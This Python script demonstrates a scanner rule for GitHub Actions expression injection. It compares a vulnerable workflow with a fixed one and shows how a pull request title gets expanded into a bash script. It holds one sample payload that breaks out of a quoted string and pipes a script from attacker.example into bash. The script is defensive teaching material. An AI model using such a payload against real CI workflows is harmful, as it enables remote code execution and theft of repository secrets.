#!/usr/bin/env python3
"""
Runs the REAL Zenith Engine rule R1016 (engine/rules/triggers.py) against
vulnerable.yml and fixed.yml, and also reproduces the literal TEXT
EXPANSION GitHub Actions performs before invoking bash: substitutes
${{ ... }} with an attacker-controlled value and shows the resulting script
that would actually run, exactly as /bin/bash would see it.
"""
import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent.parent.parent
sys.path.insert(0, str(REPO_ROOT))

from engine.parser import parse_workflow
from engine.rules.triggers import check_expression_injection_1016

# Sample payload: a realistic malicious PR title.
MALICIOUS_PR_TITLE = '"; curl -s https://attacker.example/steal.sh | bash #'


def print_alert(alert):
    print(f"  [{alert['severity']:8s}] {alert['rule_id']}  line {alert['line']}: {alert['description']}")


def analyze(path):
    print(f'\n=== {path.name} ===')
    workflow, lines = parse_workflow(str(path))
    alerts = check_expression_injection_1016(workflow, lines, lang='en')
    if not alerts:
        print('  No IW findings: no untrusted expression is interpolated directly into run:.')
        return
    for alert in sorted(alerts, key=lambda a: a['line']):
        print_alert(alert)


def simulate_expansion(path, expression_key, malicious_value):
    print(f'\n--- GitHub Actions literal expansion for {path.name} ---')
    workflow, _ = parse_workflow(str(path))

    for job in workflow.get('jobs', {}).values():
        for step in job.get('steps', []):
            run = step.get('run', '') or ''
            placeholder = '${{ ' + expression_key + ' }}'
            if placeholder in run:
                expanded = run.replace(placeholder, malicious_value)
                print('  Script BEFORE expansion (what is in the .yml):')
                for line in run.rstrip().splitlines():
                    print(f'    {line}')
                print('  Script AFTER expansion (what bash actually runs):')
                for line in expanded.rstrip().splitlines():
                    print(f'    {line}')
                print('  -> "curl ... | bash" becomes part of the real script: RCE.')
                return

    for job in workflow.get('jobs', {}).values():
        for step in job.get('steps', []):
            env = step.get('env', {}) or {}
            for var_name, value in env.items():
                if value == '${{ ' + expression_key + ' }}':
                    run = step.get('run', '') or ''
                    print(f'  The expression arrives as the {var_name} environment variable, never interpolated into the script text.')
                    print('  Script (unaffected by the variable\'s value):')
                    for line in run.rstrip().splitlines():
                        print(f'    {line}')
                    print(f'  At runtime, the shell receives {var_name}="{malicious_value}" as the VALUE of a')
                    print('  variable, never as script text: it gets printed as-is, none of its content executes.')
                    return


def main():
    base = Path(__file__).parent
    analyze(base / 'vulnerable.yml')
    analyze(base / 'fixed.yml')

    print('\n=== Injection simulation (sample payload) ===')
    print(f'  Malicious PR title used in the simulation:\n    {MALICIOUS_PR_TITLE!r}')
    simulate_expansion(base / 'vulnerable.yml', 'github.event.pull_request.title', MALICIOUS_PR_TITLE)
    simulate_expansion(base / 'fixed.yml', 'github.event.pull_request.title', MALICIOUS_PR_TITLE)


if __name__ == '__main__':
    sys.exit(main())
